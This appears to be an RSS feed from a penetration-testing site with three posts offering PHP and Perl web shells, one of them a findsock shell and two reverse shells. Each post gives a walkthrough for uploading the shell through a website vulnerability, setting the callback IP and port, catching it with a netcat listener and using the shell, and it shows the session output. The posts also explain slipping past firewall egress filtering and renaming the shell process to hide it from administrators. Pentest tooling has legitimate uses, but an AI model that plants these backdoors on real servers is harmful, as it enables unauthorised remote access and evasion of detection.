<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Web Shells &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/category/tools/web-shells/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sun, 20 Jan 2013 00:10:15 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>php-findsock-shell</title>
		<link>https://pentestmonkey.net/tools/web-shells/php-findsock-shell</link>
					<comments>https://pentestmonkey.net/tools/web-shells/php-findsock-shell#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 02 Sep 2007 15:26:26 +0000</pubDate>
				<category><![CDATA[Web Shells]]></category>
		<category><![CDATA[findsockshell]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[php]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=112</guid>

					<description><![CDATA[This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP, you want an interactive shell, but the Firewall is doing proper egress and ingress filtering &#8211; so bindshells and reverse shells won&#8217;t work. Upload php-findsock-shell to somewhere in the web root then run it [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP, you want an interactive shell, but the Firewall is doing proper egress and ingress filtering &#8211; so bindshells and reverse shells won&#8217;t work.</p>
<p>Upload php-findsock-shell to somewhere in the web root then run it by accessing the appropriate URL via netcat (as opposed to via a browser).Â  Instead of getting a normal HTTP response back, your HTTP session becomes an interactive shell session:</p>
<pre>$ nc -v target 80
target [10.0.0.1] 80 (http) open
GET /php-findsock-shell.php HTTP/1.0

sh-3.2$ id
uid=80(apache) gid=80(apache) groups=80(apache)
sh-3.2$
... you now have an interactive shell ...</pre>
<p>This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.Â  It differs from web form-based shells which allow you to send a single command, then return you the output.</p>
<p><span id="more-112"></span></p>
<h2>Download</h2>
<p><a href="http://pentestmonkey.net/tools/php-findsock-shell/php-findsock-shell-1.0.tar.gz">php-findsock-shell-1.0.tar.gz</a></p>
<p>MD5sum: aecfea69fc6b482709f339756d6b419b</p>
<p>SHA1sum: 96e1a89cb15dcb64d81a13c2211faf98e80d3518</p>
<h2>Preamble</h2>
<p>I recently read about some (old) <a href="http://www.securityfocus.com/archive/1/archive/1/449298/100/0/threaded">vulnerabilities</a> stemming from the fact that PHP scripts inherit some of Apache&#8217;s file descriptors and that programs run via PHP (e.g. via the &#8220;system&#8221; function) also inherit these file descriptors.Â  Vulnerabilities include:</p>
<ul>
<li>Overwriting apache log file &#8211; even though it&#8217;s owned by root; and</li>
<li>Hijacking apache&#8217;s listening TCP port, then killing apache so you can respond to incoming web requests</li>
</ul>
<p>This whole &#8220;inheriting file handles&#8221; class of vulnerability seems like an interesting area &#8211; albeit not a new area.</p>
<p>It occurred to me that if PHP could directly access the file handle corresponding to the TCP connection between the user&#8217;s browser and the web server, PHP might be able to attach a shell (/bin/sh) to this connection.Â  You&#8217;d then have an interactive shell which would pass straight through firewalls doing simple ingress and egree filtering.</p>
<p>Alas, I couldn&#8217;t figure out how to implement this idea purely in PHP.Â  However, with the help of a C program it&#8217;s possible to demonstrate that the idea works.</p>
<h2>Walk Through</h2>
<h3>Modify the source to prevent unauthorised access</h3>
<p>To prevent someone else from abusing your backdoor &#8211; a nightmare scenario while pentesting &#8211; you should modify the source code to prevent unauthorised access to your script.Â  This is left as an exercise to the reader.Â  I haven&#8217;t implemented this in v1.0.</p>
<h3>Compile findsock.c</h3>
<p>You need to compile findsock.c so that it&#8217;ll run on the web server you&#8217;ve gained access to.Â  If you&#8217;re running the same OS and architecture run the following locally:</p>
<p>$ gcc -o findsock findsock.c</p>
<p>If not, then you might have to compile elsewhere, or hope there&#8217;s a C compiler on the web server.</p>
<h3>Upload &#8220;findsock&#8221; and &#8220;php-findsock-shell.php&#8221;</h3>
<p>Upload the compiled binary plus the PHP script to the web server.</p>
<h3>Enjoy your new shell</h3>
<p>Access the PHP script using netcat (not using a browser).Â  If all went well, your HTTP connection should turn into an interactive shell:</p>
<pre>$ nc -v target 80
target [10.0.0.1] 80 (http) open
GET /php-findsock-shell.php HTTP/1.0</pre>
<pre>sh-3.2$ id
uid=80(apache) gid=80(apache) groups=80(apache)
sh-3.2$
... you now have an interactive shell ...</pre>
<h2>FAQs</h2>
<h3>When is this useful?</h3>
<p>When you can&#8217;t use a bindshell or reverse shell because of Firewall filtering.</p>
<p>Proper interactive shells are more useful than web-based shell in some circumstances, e.g:</p>
<ul>
<li>You want to change your user with &#8220;su&#8221;</li>
<li>You want to upgrade your shell using a local exploit</li>
<li>You want to log into another system using telnet / ssh</li>
</ul>
<h3>Isn&#8217;t the shell connection just going to be severed when the web server times out the PHP script?</h3>
<p>No.Â  It doesn&#8217;t seem to on the systems that I&#8217;ve tested it on (Gentoo Linux only so far).</p>
<h3>Isn&#8217;t there going to be a rather suspicious looking shell process when the admin runs &#8220;ps&#8221;?</h3>
<p>Yeah.Â  <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<h3>Will this work with PERL as well as PHP?</h3>
<p>I doesn&#8217;t seem to.Â  The PERL script doesn&#8217;t to inherit any interesting file handles.Â  It just has its STDIN, STDOUT and STDERR attached to a pipe.Â  However, I&#8217;m sure that there&#8217;s more than one way to configure PERL with Apache, so maybe other configurations will be prone the above problem.</p>
<h2>Caveats</h2>
<p>The shell traffic doesn&#8217;t look much like HTTP, so I guess that you may have problems if the site is being protected by a Layer 7 (Application layer) Firewall.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/web-shells/php-findsock-shell/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>php-reverse-shell</title>
		<link>https://pentestmonkey.net/tools/web-shells/php-reverse-shell</link>
					<comments>https://pentestmonkey.net/tools/web-shells/php-reverse-shell#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 26 May 2007 17:01:40 +0000</pubDate>
				<category><![CDATA[Web Shells]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[php]]></category>
		<category><![CDATA[reverseshell]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=111</guid>

					<description><![CDATA[This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP.Â  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.Â  The script will open an outbound TCP connection from the webserver to a host [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP.Â  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.Â  The script will open an outbound TCP connection from the webserver to a host and port of your choice.Â  Bound to this TCP connection will be a shell.</p>
<p>This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.Â  It differs from web form-based shell which allow you to send a single command, then return you the output.<br />
<span id="more-111"></span></p>
<h2>Download</h2>
<p><a href="http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz">php-reverse-shell-1.0.tar.gz</a></p>
<p>MD5sum:2bdf99cee7b302afdc45d1d51ac7e373</p>
<p>SHA1sum: 30a26d5b5e30d819679e0d1eb44e46814892a4ee</p>
<h2>Video</h2>
<p>I stumbled across thisÂ <a href="http://www.youtube.com/watch?v=A0Ks4MfhVIE">video</a> someone made of php-reverse-shell.</p>
<p><em>Update 2011-11: Imax sent me a link to his toolÂ <a href="http://code.google.com/p/fimap/">fimap</a>Â which uses php-reverse-shell. Â Looks cool.</em></p>
<h2>Walk Through</h2>
<h3>Modify the source</h3>
<p>To prevent someone else from abusing your backdoor &#8211; a nightmare scenario while pentesting &#8211; you need to modify the source code to indicate where you want the reverse shell thrown back to.Â  Edit the following lines of php-reverse-shell.php:</p>
<pre>$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS</pre>
<h3>Get Ready to catch the reverse shell</h3>
<p>Start a TCP listener on a host and port that will be accessible by the web server.Â  Use the same port here as you specified in the script (1234 in this example):</p>
<pre>$ nc -v -n -l -p 1234</pre>
<h3>Upload and Run the script</h3>
<p>Using whatever vulnerability you&#8217;ve discovered in the website, upload php-reverse-shell.php.Â  Run the script simply by browsing to the newly uploaded file in your web browser (NB: You won&#8217;t see any output on the web page, it&#8217;ll just hang if successful):</p>
<pre>http://somesite/php-reverse-shell.php</pre>
<h3>Enjoy your new shell</h3>
<p>If all went well, the web server should have thrown back a shell to your netcat listener.Â  Some useful commans such as w, uname -a, id and pwd are run automatically for you:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58012
Linux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU/Linux
 16:59:28 up 39 days, 19:54,  2 users,  load average: 0.18, 0.13, 0.10
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root   :0        19May07 ?xdm?   5:10m  0.01s /bin/sh
uid=81(apache) gid=81(apache) groups=81(apache)
sh: no job control in this shell
sh-3.2$</pre>
<h2>FAQs</h2>
<h3>When is this useful?</h3>
<p>Perhaps the only areas on disk that you have write access to are mounted with the &#8220;noexec&#8221; option.Â  Uploading a compiled program will be of no use in these situations.Â  You need to use an installed scripting language like Python, PERL, PHP, etc.<br />
Perhaps you just can&#8217;t be bothered to upload a second program.</p>
<h3>Isn&#8217;t the shell connection just going to be severed when the web server times out the PHP script?</h3>
<p>No.Â  It doesn&#8217;t seem to on the systems that I&#8217;ve tested it on (Gentoo Linux only so far).Â  Additionally the PHP script attempts to daemonise itself and dissociate from the parent process to avoid this (though it rarely works in practise).Â  Your browser will appear to hang when you access the reverse shell.Â  This is normal.Â  It&#8217;s OK to hit cancel in your browser once you&#8217;ve got your shell.</p>
<h3>Isn&#8217;t there going to be a rather suspicious looking shell process when the admin runs &#8220;ps&#8221;?</h3>
<p>Yeah.Â  This version of the reverse shell isn&#8217;t very subtle:</p>
<pre>apache   28106  0.0  0.0  10428  1216 ?        S    17:15   0:00 sh -c uname -a; w; id; /bin/sh -i
apache   28110  0.0  0.0  10172  1428 ?        S    17:15   0:00 /bin/sh -i</pre>
<h3>Is this page available in Serbo-Croatian?</h3>
<p>Yes. <a href="http://science.webhostinggeeks.com/php-obrnute-ljusture">Thanks to Jovana Milutinovich for translating</a>.</p>
<h2>Caveats</h2>
<p>Outbound firewalling (aka egress filtering) may prevent your reverse shell connection reaching you.Â  Pick a port that&#8217;s allowed through Firewall.Â  If there are none, you&#8217;ll have to make do with a form-based PHP shell.</p>
<p>This particular implementation of the reverse shell is unix-based.Â  You&#8217;ll need to modify it before it will work on windows.</p>
<p>I&#8217;ve noticed a couple of zombie processes while testing this shell.Â  It doesn&#8217;t always happen, but is probably to be expected since we&#8217;re not daemonising ourself properly.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/web-shells/php-reverse-shell/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>perl-reverse-shell</title>
		<link>https://pentestmonkey.net/tools/web-shells/perl-reverse-shell</link>
					<comments>https://pentestmonkey.net/tools/web-shells/perl-reverse-shell#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 26 May 2007 16:44:29 +0000</pubDate>
				<category><![CDATA[Web Shells]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[reverseshell]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=110</guid>

					<description><![CDATA[This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PERL.Â  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.Â  The script will open an outbound TCP connection from the webserver to a host [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PERL.Â  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.Â  The script will open an outbound TCP connection from the webserver to a host and port of your choice.Â  Bound to this TCP connection will be a shell.</p>
<p>This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.Â  It differs from web form-based shell which allow you to send a single command, then return you the output.<br />
<span id="more-110"></span></p>
<h2>Download</h2>
<p><a href="http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz">perl-reverse-shell-1.0.tar.gz</a></p>
<p>MD51sum: 1b38db18c1b168573afb8eeabbd8157b<br />
SHA1sum: b2dfefd3d10f5fedd674a8651e5bdcb3b3289335</p>
<h2>Walk Through</h2>
<h3>Modify the source</h3>
<p>To prevent some else from abusing your backdoor &#8211; a nightmare scenario while pentesting &#8211; you need to modify the source code to indicate where you want the reverse shell thrown back to.Â  Edit the following lines of perl-reverse-shell.pl:</p>
<pre># Where to send the reverse shell.Â  Change these.</pre>
<pre>my $ip = '127.0.0.1';</pre>
<pre>my $port = 1234;</pre>
<h3>Get Ready to catch the reverse shell</h3>
<p>Start a TCP listener on a host and port that will be accessible by the web server.Â  Use the same port here as you specified in the script (1234 in this example):</p>
<pre>$ nc -v -n -l -p 1234</pre>
<h3>Upload and Run the script</h3>
<p>Using whatever vulnerability you&#8217;ve discovered in the website, upload perl-reverse-shell.pl.Â  You&#8217;ll need to place it in a directory where PERL scripts can be run from (e.g. cgi-bin).Â  Run the script simply by browsing to the newly uploaded file in your web browser:</p>
<pre>http://somesite/cgi-bin/perl-reverse-shell.pl</pre>
<h3>Enjoy your new shell</h3>
<p>If all went well, the web server should have thrown back a shell to your netcat listener.Â  Some useful commans such as w, uname -a, id and pwd are run automatically for you:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58034
Â 16:35:52 up 39 days, 19:30,Â  2 users,Â  load average: 0.22, 0.20, 0.14
USERÂ Â Â Â  TTYÂ Â Â Â Â Â Â  LOGIN@Â Â  IDLEÂ Â  JCPUÂ Â  PCPU WHAT
root Â  :0Â Â Â Â Â Â Â  19May07 ?xdm?Â Â  5:07mÂ  0.01s /bin/sh /usr/kde/3.5/bin/startk
Linux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU/Linux
uid=81(apache) gid=81(apache) groups=81(apache)
/
apache@somehost / $</pre>
<h2>FAQs</h2>
<h3>When is this useful?</h3>
<p>Perhaps the only areas on disk that you have write access to are mounted with the &#8220;noexec&#8221; option.Â  Uploading a compiled program will be of no use in these situations.Â  You need to use an installed scripting language like Python, PERL, PHP, etc.<br />
Perhaps you just can&#8217;t be bothered to upload a second program.</p>
<h3>Isn&#8217;t the shell connection just going to be severed when the web server times out the PERL script?</h3>
<p>No.Â  It doesn&#8217;t seem to on the systems that I&#8217;ve tested it on (Gentoo Linux only so far).Â  Additionally the PERL script attempts to daemonise itself and dissociate from the parent process to avoid this.</p>
<h3>Isn&#8217;t there going to be a rather suspicious looking shell process when the admin runs &#8220;ps&#8221;?</h3>
<p>Kinda.Â  The number of processes has been minimised by using &#8220;exec&#8221; instead of &#8220;system&#8221;.Â  The &#8220;/bin/sh -i&#8221; process will be seen in the process listing but can be renamed.Â  By default /bin/sh will be renamed to /usr/sbin/apache, so the process listing looks like</p>
<pre>apacheÂ Â Â  5289Â  0.0Â  0.0Â Â  2840Â  1464 ?Â Â Â Â Â Â Â  SsÂ Â  15:31Â Â  0:00 /usr/sbin/apache -i</pre>
<h2>Caveats</h2>
<p>Outbound firewalling (aka egress filtering) may prevent your reverse shell connection reaching you.Â  Pick a port that&#8217;s allowed through Firewall.Â  If there are none, you&#8217;ll have to make do with a form-based PHP shell.</p>
<p>This particular implementation of the reverse shell is unix-based.Â  You&#8217;ll need to modify it before it will work on windows.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/web-shells/perl-reverse-shell/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
